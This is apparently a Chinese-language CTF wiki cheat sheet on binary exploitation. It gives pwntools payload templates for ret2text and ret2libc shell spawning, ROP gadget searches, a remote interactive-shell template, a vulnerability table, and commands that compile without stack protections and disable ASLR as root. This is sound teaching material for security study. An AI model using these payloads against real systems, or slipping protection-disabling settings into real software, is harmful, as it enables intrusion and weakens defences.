---
title: 二进制安全速查
icon: charm:binary
order: 3
category:
  - Wiki
  - CTF
---

Pwn（二进制漏洞利用）的核心：找到程序漏洞，控制程序执行流，拿 Shell。

<!-- more -->

## 保护机制

| 保护 | 命令参数 | 说明 |
|---|---|---|
| **Canary** | `-fno-stack-protector` 关闭 | 栈上的"金丝雀"值，溢出时会破坏 |
| **NX** | `-z execstack` 关闭 | 栈不可执行（不能用 shellcode） |
| **PIE** | `-no-pie` 关闭 | 地址随机化（GOT 和代码段地址不固定） |
| **RELRO** | — | GOT 表部分/完全只读 |
| **ASLR** | `echo 0 > /proc/sys/...` | 系统级地址随机化（Linux 默认开启） |

```bash
checksec ./binary  # 一键查看所有保护
```

## 栈溢出攻击链

### 核心公式

> **offset 填充** + **覆盖返回地址** = **控制 RIP**

### 工具：找溢出偏移

```python
from pwn import *

# 生成定位字符串
print(cyclic(200))

# 查崩溃地址对应的偏移
cyclic_find(0x61616178)  # 假设 RIP = 'xaaa'
```

### ret2text（跳转到已有代码）

```python
payload = b'A' * offset       # 填充到返回地址
payload += p64(win_addr)      # 覆盖为 win() 地址
payload += p64(0)             # 对齐（可选）
```

### ret2libc（调用 C 库函数）

```python
# 三步: pop rdi; ret → "/bin/sh"地址 → system地址
payload = b'A' * offset
payload += p64(pop_rdi)      # gadget: pop rdi; ret
payload += p64(bin_sh_addr)  # "/bin/sh" 字符串地址
payload += p64(system_addr)  # system@plt 或 libc system
```

## 常用 Gadgets

```bash
ROPgadget --binary ./vuln | grep "pop rdi"
ROPgadget --binary ./vuln | grep "ret"
```

| Gadget | 用途 |
|---|---|
| `pop rdi ; ret` | 控制第 1 个参数（System V ABI） |
| `pop rsi ; pop r15 ; ret` | 控制第 2 个参数 |
| `ret` | 栈对齐（Ubuntu 18.04+ 需要） |

## Pwntools 最小模板

```python
from pwn import *

context.arch = 'amd64'
# context.log_level = 'debug'  # 调试时开启

# p = process('./vuln')        # 本地
p = remote('host', 12345)      # 远程

# 接收/发送
p.recvuntil(b'prompt: ')       # 等待特定输出
p.sendline(payload)             # 发送一行
p.send(payload)                 # 发送原始数据

p.interactive()                 # 交互模式（拿到 shell 后）
```

### 常用函数

```python
elf = ELF('./vuln')            # 加载 ELF，读符号表
libc = ELF('./libc.so.6')      # 加载 libc

win_addr  = elf.symbols['win']  # 直接取函数地址
puts_plt  = elf.plt['puts']     # PLT 地址
puts_got  = elf.got['puts']     # GOT 地址

rop = ROP(elf)                  # 自动找 gadget
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]

# 格式化输出
print(hex(win_addr))
```

## 漏洞类型速查

| 漏洞 | 成因 | 关键特征 |
|---|---|---|
| **栈溢出** | `gets(buf)` / `read` 超界 | 覆盖返回地址 |
| **格式化字符串** | `printf(input)` 无格式控制 | `%p` 泄露地址，`%n` 任意写 |
| **整数溢出** | 大数相加 → 回绕 | 绕过长度检查 |
| **UAF** | free 后继续用 | 悬挂指针指向被回收的内存 |
| **Off-by-One** | 边界多写一个字节 | 精确覆盖相邻结构的关键字段 |
| **Double Free** | 同一指针 free 两次 | 破坏堆分配器的链表 |

## 内存布局（调用栈）

```
+------------------+ 高地址
| 函数参数 (arg2)   |
| 函数参数 (arg1)   |
| 返回地址 ← 覆盖它   |  ← RIP 被劫持的地方
| caller's rbp     |
| 局部变量 (buf[16]) |  ← 溢出从这里开始
| ...              |
+------------------+ 低地址
```

## 环境搭建

```bash
# 编译无保护的测试程序
gcc -fno-stack-protector -no-pie -o vuln vuln.c

# 关闭系统 ASLR（需要 root）
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space

# 核心工具
pip install pwntools ROPgadget checksec
```

## 交叉引用

- [逆向工程参考](./reverse.md) — IDA/GDB 使用
- [杂项工具与技法](./misc.md) — Python 等通用工具
